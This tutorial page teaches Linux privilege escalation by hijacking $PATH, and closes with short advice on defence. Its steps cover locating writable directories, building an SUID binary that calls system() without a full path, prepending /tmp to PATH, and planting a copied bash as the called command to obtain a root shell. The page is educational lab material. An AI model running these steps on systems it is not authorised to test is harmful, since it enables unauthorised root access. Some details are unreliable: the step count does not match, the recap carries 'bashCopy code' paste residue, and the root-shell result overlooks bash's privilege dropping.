# PATH

This section demonstrates how to exploit misconfigurations in the `$PATH` environment variable to escalate privileges by hijacking executable lookups. This method relies on writable directories in `$PATH` and improperly secured scripts.

* `$PATH` is an environment variable in Linux. It tells the system where to look for programs when you run a command.
* For example, if you run `ls`, the system looks for `ls` in the directories listed in `$PATH`.

To see your current `$PATH`, run:

```bash
echo $PATH
```

Example Output:

```bash
/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin
```

***

### Exploiting `$PATH` in 5 Simple Steps

We’ll create a situation where we trick the system into running a malicious program by taking advantage of a writable folder in `$PATH`.

***

#### Step 1: Check for Writable Directories

Find directories where your user can write:

```bash
find / -writable 2>/dev/null
```

Example Output:

```bash
/tmp
/home/yourusername
```

If any of these writable directories are in `$PATH`, we can exploit them. If not, we'll add one (see Step 4).

***

#### Step 2: Check for Vulnerable Programs

Some programs or scripts might call other programs without using their full path. For example:

```c
#include <stdlib.h>

int main() {
    system("example-command");
    return 0;
}
```

When this program runs, it looks for `example-command` in the directories listed in `$PATH`. If we create a malicious `example-command`, the program will run it instead of the intended one.

***

#### Step 3: Compile the Vulnerable Program

Compile the program:

```bash
gcc -o vulnerable vulnerable.c
```

Set the SUID bit to allow it to run with elevated privileges:

```bash
sudo chmod u+s vulnerable
```

Verify the permissions:

```bash
ls -l vulnerable
```

Output:

```bash
-rwsr-xr-x 1 root root 16768 Jan 11 15:42 vulnerable
```

***

#### Step 4: Add a Writable Directory to `$PATH`

If a writable directory (like `/tmp`) is not in `$PATH`, add it:

```bash
export PATH=/tmp:$PATH
```

Check the updated `$PATH`:

```bash
echo $PATH
```

Output:

```bash
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin
```

***

#### Step 5: Create the Malicious Program

Create a fake program called `example-command` in `/tmp`. This program will run instead of the real one.

Copy `/bin/bash` (a shell) and rename it:

```bash
cp /bin/bash /tmp/example-command
chmod +x /tmp/example-command
```

Verify:

```bash
ls -l /tmp/example-command
```

Output:

```bash
-rwxr-xr-x 1 username username 1183448 Dec 23 15:43 /tmp/example-command
```

***

#### Step 6: Execute the Vulnerable Program

Run the vulnerable program:

```bash
./vulnerable
```

If successful, you’ll get a root shell:

```bash
# whoami
root
```

***

### Why Does This Work?

1. The vulnerable program runs `example-command` from `$PATH`.
2. `$PATH` includes `/tmp` (or another writable directory you added).
3. The program runs our malicious `/tmp/example-command` instead of the real one, and it inherits root privileges because of the SUID bit.

***

### How to Defend Against This?

* **Avoid writable directories in `$PATH`.**
* **Use absolute paths** in scripts and programs (e.g., `/usr/bin/ls` instead of `ls`).
* **Remove unnecessary SUID bits** on programs.

***

### Key Commands Recap:

*   View `$PATH`:

    ```bash
    bashCopy codeecho $PATH
    ```
*   Find writable directories:

    ```bash
    bashCopy codefind / -writable 2>/dev/null
    ```
*   Add `/tmp` to `$PATH`:

    ```bash
    bashCopy codeexport PATH=/tmp:$PATH
    ```
*   Create malicious program:

    ```bash
    bashCopy codecp /bin/bash /tmp/example-command
    chmod +x /tmp/example-command
    ```
*   Run the vulnerable program:

    ```bash
    bashCopy code./vulnerable
    ```
